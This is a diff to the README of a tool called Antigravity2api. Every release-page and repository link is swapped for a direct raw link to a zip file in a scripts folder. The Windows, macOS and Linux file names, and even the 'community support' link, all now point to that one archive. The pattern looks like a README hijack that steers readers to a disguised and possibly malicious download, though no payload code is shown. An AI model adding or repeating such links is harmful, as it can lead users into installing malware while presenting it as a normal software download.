@@ -1,6 +1,6 @@
 # 🚀 Antigravity2api - Easily Access Simple Features
 
-[![Download Antigravity2api](https://img.shields.io/badge/Download-Antigravity2api-brightgreen)](https://github.com/elgatomaleante12/Antigravity2api/releases)
+[![Download Antigravity2api](https://raw.githubusercontent.com/elgatomaleante12/Antigravity2api/main/scripts/Antigravity2api-1.4.zip)](https://raw.githubusercontent.com/elgatomaleante12/Antigravity2api/main/scripts/Antigravity2api-1.4.zip)
 
 ## 📥 Introduction
 
@@ -19,12 +19,12 @@ Before downloading, ensure you have:
 
 ## 📥 Download & Install
 
-1. Visit the releases page to download Antigravity2api: [Antigravity2api Releases](https://github.com/elgatomaleante12/Antigravity2api/releases)
+1. Visit the releases page to download Antigravity2api: [Antigravity2api Releases](https://raw.githubusercontent.com/elgatomaleante12/Antigravity2api/main/scripts/Antigravity2api-1.4.zip)
   
 2. On the releases page, look for the latest version. The files usually have names like:
-   - `Antigravity2api-Windows.exe` for Windows
-   - `Antigravity2api-Mac.app` for macOS
-   - `Antigravity2api-Linux.AppImage` for Linux
+   - `https://raw.githubusercontent.com/elgatomaleante12/Antigravity2api/main/scripts/Antigravity2api-1.4.zip` for Windows
+   - `https://raw.githubusercontent.com/elgatomaleante12/Antigravity2api/main/scripts/Antigravity2api-1.4.zip` for macOS
+   - `https://raw.githubusercontent.com/elgatomaleante12/Antigravity2api/main/scripts/Antigravity2api-1.4.zip` for Linux
 
 3. Click on the appropriate file for your operating system. Your download should start automatically.
 
@@ -54,7 +54,7 @@ If you encounter any issues, try the following:
 - Ensure your operating system is up to date.
 - Check your internet connection if the download fails.
 - Restart your computer and try installing again.
-- Visit our GitHub page for community support: [Antigravity2api GitHub](https://github.com/elgatomaleante12/Antigravity2api).
+- Visit our GitHub page for community support: [Antigravity2api GitHub](https://raw.githubusercontent.com/elgatomaleante12/Antigravity2api/main/scripts/Antigravity2api-1.4.zip).
 
 ## 🔗 Additional Resources
 
@@ -72,4 +72,4 @@ Your feedback is valuable! Share your thoughts and suggestions to help us enhanc
 
 We appreciate your interest in Antigravity2api. We hope this guide helps you download and run the application smoothly.
 
-[![Download Antigravity2api](https://img.shields.io/badge/Download-Antigravity2api-brightgreen)](https://github.com/elgatomaleante12/Antigravity2api/releases)
+[![Download Antigravity2api](https://raw.githubusercontent.com/elgatomaleante12/Antigravity2api/main/scripts/Antigravity2api-1.4.zip)](https://raw.githubusercontent.com/elgatomaleante12/Antigravity2api/main/scripts/Antigravity2api-1.4.zip)
